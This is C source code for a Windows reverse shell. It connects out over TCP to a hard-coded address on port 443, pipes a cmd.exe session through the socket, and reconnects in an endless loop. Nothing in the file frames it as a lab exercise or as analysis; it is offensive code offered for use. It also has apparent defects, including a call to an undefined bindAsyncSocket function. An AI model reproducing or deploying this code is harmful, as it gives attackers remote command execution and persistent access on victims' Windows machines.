// excludes certian API libs for more efficient builds
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <namedpipeapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>

// disable console https://stackoverflow.com/a/8732076/11567632

// Needed to Statically compile, otherwise VS C/C++ is needed
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "443"
#define DEFAULT_SERVER "192.168.72.157"

int confAddrInfo(struct addrinfo **result) {
	struct addrinfo hints;
	int iResult;

	// Config socket
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(DEFAULT_SERVER, DEFAULT_PORT, &hints, result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}
	return 0;
}

int bindSocket(SOCKET *ConnectSocket, struct addrinfo *result) {
	int iResult;

	// Create a SOCKET for connecting to server
	// WSA_FLAG_OVERLAPPED can't be set with CreateProcess
	*ConnectSocket = WSASocket(result->ai_family, result->ai_socktype,
		result->ai_protocol, NULL, 0, 0);
	if (*ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	// Connect to server.
	printf("Connecting to server\n");
	iResult = WSAConnect(*ConnectSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		*ConnectSocket = INVALID_SOCKET;
	}
}

int shell(SOCKET* ConnectSocket) {
	// winapi > pipeing to cmd.exe
	int iResult = 0;
	printf("Spawning process\n");
	char Process[] = "C:\\Windows\\System32\\cmd.exe";
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);


	sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;

	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
		printf("CreateProcess failed (%d).\n", GetLastError());
	}

	WaitForSingleObject(pinfo.hProcess, INFINITE); //blocks till proc finishes
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	printf("Process exited\n");

	return 0;
}

// lazy WSA event listen / pipe code for intermitten read
// could reimplement in socket overlap
int syncShell(SOCKET *ConnectSocket) {
	// winapi > pipeing to cmd.exe
	int iResult = 0;
	printf("Spawning process\n");
	char Process[] = "C:\\Windows\\System32\\cmd.exe";
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	// create pipe for external commands
	SECURITY_ATTRIBUTES	 saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL;
	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	iResult = CreatePipe(&hReadPipe, &hWritePipe, &saAttr, DEFAULT_BUFLEN);
	if (iResult == 0) {
		printf("Pipe Error");
	}

	//sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;
	sinfo.hStdOutput = sinfo.hStdError = (HANDLE) *ConnectSocket;
	sinfo.hStdInput = hReadPipe;

	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
		printf("CreateProcess failed (%d).\n", GetLastError());
	}

	// implement pipe logic
	char buf[DEFAULT_BUFLEN];
	DWORD len = 0;
	WSABUF DataBuf;
	DataBuf.len = DEFAULT_BUFLEN;
	DataBuf.buf = buf;
	DWORD flags = 0;
	// sock close check?
	WSAEVENT lEvent = WSACreateEvent();
	WSAEventSelect(*ConnectSocket, lEvent, FD_READ);
	while (1) {
		// implement a check to see if write has stopped sending?
		WaitForSingleObject(lEvent, INFINITE);

		iResult = ReadFile((HANDLE) *ConnectSocket, buf, DEFAULT_BUFLEN, &len, NULL);
		//iResult = WSARecv(*ConnectSocket, &DataBuf, 1, &len, &flags, NULL, NULL);
		if (iResult == 0) {
			printf("File Error");
		}

		printf("%d: %.*s\n",len, len, buf);
		WriteFile(hWritePipe, buf, len, NULL, NULL);
		//iResult = WriteFile(hWritePipe, "dir\n", 4, NULL, NULL); // WORKS
	}

	WaitForSingleObject(pinfo.hProcess, INFINITE); //blocks till proc finishes
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	printf("Process exited\n");

	return 0;
}

// stupid simple threading
int threadShell(SOCKET* ConnectSocket) {
	HANDLE thread = NULL;
	DWORD threadID = NULL;
	thread = CreateThread(NULL, 0, shell, ConnectSocket, 0, &threadID);
	return 0;
}

int __cdecl main(int argc, char** argv)
{
	while (1) {
		WSADATA wsaData;
		SOCKET ConnectSocket = INVALID_SOCKET;
		struct addrinfo *result = NULL;
		const char* sendbuf = "this is a test";
		int iResult;
		int recvbuflen = DEFAULT_BUFLEN;

		// Initialize Winsock
		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0) {
			printf("WSAStartup failed with error: %d\n", iResult);
			continue;
		}

		// Ptr->Ptr PassbyRef
		iResult = confAddrInfo(&result);
		if (iResult != 0) {
			continue;
		}

		bindAsyncSocket(&ConnectSocket, result);

		freeaddrinfo(result);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("Unable to connect to server!\n");
			WSACleanup();
			continue;
		}

		//threadShell(&ConnectSocket);
		shell(&ConnectSocket);
		//syncShell(&ConnectSocket);

		// shutdown the connection since no more data will be sent
		iResult = shutdown(ConnectSocket, SD_SEND);
		if (iResult == SOCKET_ERROR) {
			printf("shutdown failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			continue;
		}


		// cleanup
		closesocket(ConnectSocket);
		WSACleanup();

		continue;
	}
	return 0;
}
